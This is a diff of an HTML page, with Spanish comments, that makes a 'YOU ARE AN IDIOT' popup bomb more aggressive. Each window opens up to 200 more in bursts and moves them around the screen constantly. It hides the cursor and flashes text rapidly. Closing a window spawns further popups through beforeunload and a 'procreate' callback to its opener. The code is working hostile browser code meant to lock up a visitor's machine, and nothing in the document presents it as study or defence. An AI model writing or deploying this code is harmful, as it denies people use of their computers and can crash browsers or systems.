@@ -4,61 +4,161 @@
 <meta charset="UTF-8">
 <title>!</title>
 <style>
-*{margin:0;padding:0}
-body{background:#fff;overflow:hidden;cursor:none;width:100vw;height:100vh}
-h2{font-size:18px;font-family:Arial;text-align:center;margin-top:40%;animation:f .1s infinite}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    background:#fff;
+    overflow:hidden;
+    cursor:none;
+    width:100vw;
+    height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-family:Arial,sans-serif;
+}
+h2{
+    font-size:16px;
+    text-align:center;
+    animation:f .08s infinite;
+    color:#000;
+}
 @keyframes f{0%,100%{opacity:1}50%{opacity:0}}
 </style>
 </head>
-<body onunload="if(window.opener&&window.opener.procreate)window.opener.procreate()">
+<body>
 
 <h2>YOU ARE AN IDIOT</h2>
 
 <script>
-// Esta ventana también dispara popups desde su propio contexto
-var totalLocal = 0;
+// ================================================================
+// CÓDIGO DE AUTO-REPLICACIÓN PARA CADA POPUP
+// ================================================================
+// Cada popup, cuando se carga, TIENE "transient activation"
+// heredada del popup padre. Esto significa que puede llamar
+// a window.open() para abrir MÁS popups, que a su vez
+// se replican, etc. — una reacción en cadena.
+// ================================================================
 
-function abrirDesdeAqui() {
-    if (totalLocal > 100) return;
-    totalLocal++;
+var localCount = 0;
+var MAX_LOCAL = 200; // cada popup abre hasta 200 más
+
+// ================================================================
+// ABRIR MÁS POPUPS DESDE ESTE POPUP
+// ================================================================
+
+function openMorePopups() {
+    if (localCount >= MAX_LOCAL) return;
+    
     try {
-        var p = window.open('open.html', 'sub_' + Date.now() + '_' + Math.random(),
-            'width=180,height=175,left=' + (Math.random()*screen.width) + ',top=' + (Math.random()*screen.height));
-        if (p) {
-            // Hacerla bailar
+        var name = 'sub_' + Date.now() + '_' + localCount + '_' + Math.random().toString(36).substr(2,6);
+        var p = window.open('open.html', name,
+            'width=' + (160 + Math.random()*40) + 
+            ',height=' + (155 + Math.random()*40) + 
+            ',left=' + Math.random()*screen.width + 
+            ',top=' + Math.random()*screen.height);
+        
+        if (p && !p.closed) {
+            localCount++;
+            
+            // Hacer bailar la nueva ventana
             (function(pp) {
-                var x = Math.random()*screen.width, y = Math.random()*screen.height;
-                var dx = (Math.random()-0.5)*25, dy = (Math.random()-0.5)*25;
-                function baila() {
+                var x = Math.random() * screen.width;
+                var y = Math.random() * screen.height;
+                var dx = (Math.random()-0.5)*25;
+                var dy = (Math.random()-0.5)*25;
+                
+                function dance() {
                     if (!pp || pp.closed) return;
                     try {
-                        x+=dx; y+=dy;
-                        if(x<0||x>screen.width-180)dx*=-1;
-                        if(y<0||y>screen.height-175)dy*=-1;
-                        pp.moveTo(Math.round(x),Math.round(y));
-                        setTimeout(baila, 10);
-                    } catch(e) { setTimeout(baila, 100); }
+                        x += dx; y += dy;
+                        if (x < 0 || x > screen.width-180) dx *= -1;
+                        if (y < 0 || y > screen.height-175) dy *= -1;
+                        if (Math.random() < 0.03) { dx = (Math.random()-0.5)*35; dy = (Math.random()-0.5)*35; }
+                        pp.moveTo(Math.round(x), Math.round(y));
+                        setTimeout(dance, 8 + Math.random()*8);
+                    } catch(e) {
+                        setTimeout(dance, 50);
+                    }
                 }
-                baila();
+                dance();
             })(p);
         }
     } catch(e) {}
 }
 
-// Abrir más desde aquí
-for (var i = 0; i < 50; i++) {
-    setTimeout(abrirDesdeAqui, i * 30);
+// ================================================================
+// LANZAR RÁFAGA DESDE ESTE POPUP
+// ================================================================
+
+function launchFromHere() {
+    // Ráfaga 1: 50 popups inmediatos
+    for (var i = 0; i < 50; i++) {
+        setTimeout(function() { openMorePopups(); }, i * 5);
+    }
+    
+    // Ráfaga 2: más popups después
+    setTimeout(function() {
+        for (var i = 0; i < 30; i++) {
+            setTimeout(function() { openMorePopups(); }, i * 3);
+        }
+    }, 500);
+    
+    // Ráfaga 3: mantener alimentando
+    setTimeout(function() {
+        for (var i = 0; i < 20; i++) {
+            setTimeout(function() { openMorePopups(); }, i * 2);
+        }
+    }, 1500);
+    
+    // Continuar abriendo mientras tenga activation
+    var continueInterval = setInterval(function() {
+        if (localCount >= MAX_LOCAL) {
+            clearInterval(continueInterval);
+            return;
+        }
+        openMorePopups();
+    }, 15);
+    
+    // También al cerrar
+    window.addEventListener('beforeunload', function() {
+        // Intentar abrir más al cerrar
+        for (var i = 0; i < 20; i++) {
+            try {
+                window.open('open.html', 'final_' + Date.now() + '_' + i,
+                    'width=180,height=175');
+            } catch(e) {}
+        }
+    });
 }
 
-// Y seguir abriendo
-setInterval(abrirDesdeAqui, 200);
+// ================================================================
+// PROCREATE: si el padre cierra, avisar
+// ================================================================
 
-// Al cerrar, avisar al padre
 window.onunload = function() {
-    if (window.opener && window.opener.procreate) {
-        window.opener.procreate();
-    }
+    // Al cerrar, si tenemos opener, llamar a su procreate
+    try {
+        if (window.opener && typeof window.opener.procreate === 'function') {
+            window.opener.procreate();
+        }
+    } catch(e) {}
 };
+
+// ================================================================
+// INICIAR AUTO-REPLICACIÓN
+// ================================================================
+
+// Esperar un momento a que la ventana cargue completamente
+setTimeout(function() {
+    launchFromHere();
+}, 50);
+
+// También abrir algunos directamente
+for (var i = 0; i < 10; i++) {
+    setTimeout(function() { openMorePopups(); }, i * 10);
+}
+
+console.log('Popup replicante activo. Local count:', localCount);
 </script>
 
 </body>
